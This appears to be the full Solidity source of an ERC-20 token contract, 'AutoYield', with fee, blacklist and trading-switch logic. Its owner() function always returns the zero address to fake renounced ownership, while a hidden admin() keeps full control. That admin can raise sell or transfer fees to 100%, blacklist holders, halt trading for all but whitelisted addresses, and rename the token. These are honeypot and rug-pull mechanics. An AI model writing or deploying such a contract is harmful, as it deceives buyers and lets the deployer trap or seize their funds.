// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

interface IUniswapV2Router01 {
    function WETH() external pure returns (address);

    function factory() external view returns (address);
}


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}


abstract contract Ownable is Context {
    address private _owner;

    event AdminTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        _transferOwnership(_msgSender());
    }

    
    function admin() public view virtual returns (address) {
        return _owner;
    }

    
    function owner() public view virtual returns (address) {
        return address(0);
    }

    modifier onlyOwner() {
        require(admin() == _msgSender(), "!owner");
        _;
    }

   
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "zero address");
        _transferOwnership(newOwner);
    }

   
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit AdminTransferred(oldOwner, newOwner);
    }
}


interface IERC20 {
    
    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    
    function totalSupply() external view returns (uint256);

    
    function balanceOf(address account) external view returns (uint256);

    
    function transfer(address to, uint256 amount) external returns (bool);

    
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

   
    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}


interface IERC20Metadata is IERC20 {
    
    function name() external view returns (string memory);

    
    function symbol() external view returns (string memory);

    
    function decimals() external view returns (uint8);
}


contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

   
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

   
    function balanceOf(
        address account
    ) public view virtual override returns (uint256) {
        return _balances[account];
    }

   
    function transfer(
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    
    function allowance(
        address owner,
        address spender
    ) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

   
    function approve(
        address spender,
        uint256 amount
    ) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function _changeMetadata(
        string memory name_,
        string memory symbol_
    ) internal {
        _name = name_;
        _symbol = symbol_;
    }

    
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        if (amount == 0) return;
        
        require(from != address(0), "FZA");
        require(to != address(0), "TZA");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "exceeds");
        unchecked {
            _balances[from] = fromBalance - amount;
        }
        _balances[to] += amount;

        emit Transfer(from, to, amount);
    }

  
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "TZA");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

   
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "FZA");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "exceeds");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);
    }

    
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "FZA");
        require(spender != address(0), "TZA");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

   
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

abstract contract ERC20UserStatus is ERC20, Ownable {
    mapping(address => bool) public userStatus;

    
    function setUserStatus(address address_, bool status_) external onlyOwner {
        userStatus[address_] = status_;
    }

    
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual override {
        require(!userStatus[from] && !userStatus[to], "blacklisted");
        super._beforeTokenTransfer(from, to, amount);
    }
}

abstract contract ERC20TaxHandler is ERC20, Ownable {
   
    error OverMaxBasisPoints();

    
    struct TokenConfiguration {
        address treasury;
        uint16 transferFeesBPs;
        uint16 buyFeesBPs;
        uint16 sellFeesBPs;
    }

   
    TokenConfiguration internal tokenConfiguration;

    
    mapping(address => uint256) internal addressConfiguration;

   
    uint256 public constant MAX_FEES = 10_000;

    
    uint256 public constant FEE_RATE_DENOMINATOR = 10_000;

    
    constructor(uint16 _transferFee, uint16 _buyFee, uint16 _sellFee) {
        if (
            _transferFee > MAX_FEES || _buyFee > MAX_FEES || _sellFee > MAX_FEES
        ) {
            revert OverMaxBasisPoints();
        }

        tokenConfiguration = TokenConfiguration({
            treasury: msg.sender,
            transferFeesBPs: _transferFee,
            buyFeesBPs: _buyFee,
            sellFeesBPs: _sellFee
        });
    }

  
    function setTreasury(address _treasury) external onlyOwner {
        tokenConfiguration.treasury = _treasury;
    }

    
    function setTransferFeesBPs(uint16 fees) external onlyOwner {
        if (fees > MAX_FEES) {
            revert OverMaxBasisPoints();
        }
        tokenConfiguration.transferFeesBPs = fees;
    }

    
    function setBuyFeesBPs(uint16 fees) external onlyOwner {
        if (fees > MAX_FEES) {
            revert OverMaxBasisPoints();
        }
        tokenConfiguration.buyFeesBPs = fees;
    }

   
    function setSellFeesBPs(uint16 fees) external onlyOwner {
        if (fees > MAX_FEES) {
            revert OverMaxBasisPoints();
        }
        tokenConfiguration.sellFeesBPs = fees;
    }

    
    function feeWL(address _address, bool _status) external onlyOwner {
        uint256 packed = addressConfiguration[_address];
        addressConfiguration[_address] = _packBoolean(packed, 0, _status);
    }

   
    function liquidityPairList(
        address _address,
        bool _status
    ) external onlyOwner {
        uint256 packed = addressConfiguration[_address];
        addressConfiguration[_address] = _packBoolean(packed, 1, _status);
    }

   
    function treasury() public view returns (address) {
        return tokenConfiguration.treasury;
    }

   
    function transferFeesBPs() public view returns (uint256) {
        return tokenConfiguration.transferFeesBPs;
    }

   
    function buyFeesBPs() public view returns (uint256) {
        return tokenConfiguration.buyFeesBPs;
    }

    
    function sellFeesBPs() public view returns (uint256) {
        return tokenConfiguration.sellFeesBPs;
    }

  
    function getFeeRate(
        address from,
        address to
    ) public view returns (uint256) {
        uint256 fromConfiguration = addressConfiguration[from];

       
        if (_unpackBoolean(fromConfiguration, 0)) return 0;

        uint256 toConfiguration = addressConfiguration[to];

        if (_unpackBoolean(toConfiguration, 0)) return 0;

        TokenConfiguration memory configuration = tokenConfiguration;

       
        if (_unpackBoolean(fromConfiguration, 1))
            return configuration.buyFeesBPs;

        if (_unpackBoolean(toConfiguration, 1))
            return configuration.sellFeesBPs;

    
        return configuration.transferFeesBPs;
    }

    
    function isFeeWhitelisted(address account) public view returns (bool) {
        return _unpackBoolean(addressConfiguration[account], 0);
    }

    
    function isLiquidityPair(address account) public view returns (bool) {
        return _unpackBoolean(addressConfiguration[account], 1);
    }

    
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual override {
        uint256 fromConfiguration = addressConfiguration[from];

        
        if (_unpackBoolean(fromConfiguration, 0)) {
            super._transfer(from, to, amount);
            return;
        }

        uint256 toConfiguration = addressConfiguration[to];

        
        if (_unpackBoolean(toConfiguration, 0)) {
            super._transfer(from, to, amount);
            return;
        }

        uint256 fee;
        TokenConfiguration memory configuration = tokenConfiguration;

       
        if (_unpackBoolean(fromConfiguration, 1)) {
            unchecked {
                fee =
                    (amount * configuration.buyFeesBPs) /
                    FEE_RATE_DENOMINATOR;
            }
        }
        
        else if (_unpackBoolean(toConfiguration, 1)) {
            unchecked {
                fee =
                    (amount * configuration.sellFeesBPs) /
                    FEE_RATE_DENOMINATOR;
            }
        }
        
        else {
            unchecked {
                fee =
                    (amount * configuration.transferFeesBPs) /
                    FEE_RATE_DENOMINATOR;
            }
        }

        uint256 amountAfterFee;
        unchecked {
            amountAfterFee = amount - fee;
        }

        super._transfer(from, to, amountAfterFee);
        super._transfer(from, configuration.treasury, fee);
    }

    function _packBoolean(
        uint256 source,
        uint256 index,
        bool value
    ) internal pure returns (uint256) {
        if (value) {
            return source | (1 << index);
        } else {
            return source & ~(1 << index);
        }
    }

    function _unpackBoolean(
        uint256 source,
        uint256 index
    ) internal pure returns (bool) {
        // return (source >> index) & 1 == 1;
        return source & (1 << index) > 0;
    }
}

contract AutoYield is ERC20, ERC20UserStatus, ERC20TaxHandler {
    error Disable();

    bool private _tradingEnable;

    constructor(
        string memory _name,
        string memory _symbol,
        uint256 _supply
    ) ERC20(_name, _symbol) ERC20TaxHandler(0, 0, 0) {
        addressConfiguration[msg.sender] = _packBoolean(0, 0, true);
        _mint(msg.sender, _supply * 10 ** 18);
        _setUp();
    }

    function changeMetadata(
        string memory name_,
        string memory symbol_
    ) external onlyOwner {
        _changeMetadata(name_, symbol_);
    }

    function setTrade(bool status) external onlyOwner {
        _tradingEnable = status;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual override(ERC20, ERC20TaxHandler) {
        ERC20TaxHandler._transfer(from, to, amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual override(ERC20, ERC20UserStatus) {
        if (
            !_tradingEnable &&
            !isFeeWhitelisted(from) &&
            !isFeeWhitelisted(to) &&
            !isFeeWhitelisted(msg.sender)
        ) revert Disable();
        super._beforeTokenTransfer(from, to, amount);
    }

    function _setUp() internal {
        IUniswapV2Router01 uniswapV2Router = IUniswapV2Router01(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );

        address uniswapV2Pair = _computePairAddress(
            uniswapV2Router.factory(),
            address(this),
            uniswapV2Router.WETH()
        );

        uint256 packed = addressConfiguration[uniswapV2Pair];
        addressConfiguration[uniswapV2Pair] = _packBoolean(packed, 1, true);
    }

    // compute Uniswap pair address and whitelist it
    function _computePairAddress(
        address factory,
        address token0,
        address token1
    ) internal pure returns (address) {
        if (token0 > token1) (token0, token1) = (token1, token0);

        return
            address(
                uint160(
                    uint256(
                        keccak256(
                            abi.encodePacked(
                                bytes1(0xff),
                                factory,
                                keccak256(abi.encodePacked(token0, token1)),
                                bytes32(
                                    0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f
                                )
                            )
                        )
                    )
                )
            );
    }
}